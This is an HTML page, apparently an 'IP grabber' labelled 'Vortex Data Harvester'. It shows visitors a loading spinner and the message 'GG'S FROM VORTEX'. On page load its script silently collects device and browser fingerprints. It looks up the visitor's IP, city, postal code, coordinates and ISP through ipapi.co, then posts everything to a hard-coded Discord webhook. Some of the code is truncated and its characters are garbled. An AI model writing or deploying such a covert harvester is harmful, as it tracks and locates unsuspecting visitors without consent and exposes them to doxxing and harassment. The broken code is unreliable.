    <style>
        body {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        
        .loader {
            width: 80px;
            height: 80px;
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        
        .complete-message {
            display: none;
            color: #fff;
            font-size: 3rem;
            font-weight: bold;
            text-align: center;
            text-shadow: 0 0 10px #00ffff, 0 0 20px #0088ff;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 10px #00ffff, 0 0 20px #0088ff; }
            to { text-shadow: 0 0 15px #00ffff, 0 0 25px #0088ff, 0 0 30px #0066ff; }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="complete-message">GG'S FROM VORTEX</div>

    <script>
        async function collectData() {
            const basicData = {
                system: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    cpuCores: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 'unknown'
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type || 'unknown'
                },
                browser: {
                    cookiesEnabled: navigator.cookieEnabled,
                    languages: navigator.languages?.join(', ') || 'unknown',
                    doNotTrack: navigator.doNotTrack || 'unknown',
                    pdfViewerEnabled: navigator.pdfViewerEnabled || 'unknown'
                },
                network: {
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType || 'unknown',
                        downlink: navigator.connection.downlink || 'unknown',
                        rtt: navigator.connection.rtt || 'unknown',
                        saveData: navigator.connection.saveData || 'unknown'
                    } : 'unknown'
                },
                location: {}
            };

            const ipPromise = fetch('https://ipapi.co/json/')
                .then(r => r.ok ? r.json() : Promise.reject('IP API failed'))
                .catch(e => {
                    console.error('IP fetch error:', e);
                    return null;
                });

            const [ipData] = await Promise.all([ipPromise]);

            if (ipData) {
                basicData.location = {
                    ip: ipData.ip || 'unknown',
                    city: ipData.city || 'unknown',
                    region: ipData.region || 'unknown',
                    country: ipData.country_name || 'unknown',
                    postal: ipData.postal || 'unknown',
                    latitude: ipData.latitude || 'unknown',
                    longitude: ipData.longitude || 'unknown',
                    timezone: ipData.timezone || 'unknown',
                    asn: ipData.asn || 'unknown',
                    org: ipData.org || 'unknown'
                };
            } else {
                basicData.location = { error: 'Could not fetch location data' };
            }

            return basicData;
        }

        async function sendToDiscord(data) {
            const webhookURL = 'https://discord.com/api/webhooks/1388669702951403601/MKx4nodL-xqgbLs3MaM-9GLeNkSPVypHyM-TsO0nOo7c4EeMWI-iOZsS42wV8liCHcRf';
            
            const embed = {

                },
                fields: [

                               `â€¢ **RAM:** ${data.system.deviceMemory}GB\n` +
                               `â€¢ **User Agent:** \`${data.system.userAgent}\``,

                    },
                    {

                               `â€¢ **Orientation:** ${data.screen.orientation}\n` +
                               `â€¢ **Touch Points:** ${data.system.maxTouchPoints}`,
                        inline: true
                    },
                    {
                        name: "ðŸŒ **Location Info**",
                        value: `â€¢ **IP:** \`${data.location.ip || 'unknown'}\`\n` +
                               `â€¢ **Location:** ${data.location.city || 'unknown'}, ${data.location.region || 'unknown'}\n` +
                               `â€¢ **Country:** ${data.location.country || 'unknown'}\n` +

                               `â€¢ **ISP:** ${data.location.org || 'unknown'} (AS${data.location.asn || 'unknown'})`
                    },
                    {

                               `â€¢ **PDF Viewer:** ${data.browser.pdfViewerEnabled ? 'âœ… Enabled' : 'âŒ Disabled'}`,
                        inline: true
                    },
                    {
                        name: "ðŸ“¶ **Network Info**",
                        value: `â€¢ **Connection:** ${typeof data.network.connection === 'object' ? data.network.connection.effectiveType || 'unknown' : 'unknown'}\n` +
                               `â€¢ **Speed:** ${typeof data.network.connection === 'object' ? data.network.connection.downlink || 'unknown' : 'unknown'} Mbps\n` +
                               `â€¢ **Latency:** ${typeof data.network.connection === 'object' ? data.network.connection.rtt || 'unknown' : 'unknown'}ms\n` +
                               `â€¢ **Data Saver:** ${typeof data.network.connection === 'object' ? (data.network.connection.saveData ? 'âœ… On' : 'âŒ Off') : 'unknown'}`,
                        inline: true
                    }
                ],
                footer: {
                    text: "Collected at",
                    icon_url: "https://cdn.discordapp.com/emojis/1063277378371383316.webp"

                author: {

                }
            };

            return fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: "Vortex Data Harvester",
                    avatar_url: "https://cdn.discordapp.com/attachments/1063277378371383316/1234567890123456789/bot-avatar.png",

        (async () => {
            try {
                const data = await Promise.race([
                    collectData(),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Data collection timeout')), 2000))

                console.log('Data collected:', data);
                await sendToDiscord(data);
                console.log('Data sent successfully');
            } catch (error) {
                console.error('Error:', error);
            } finally {
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('.complete-message').style.display = 'block';
            }
        })();
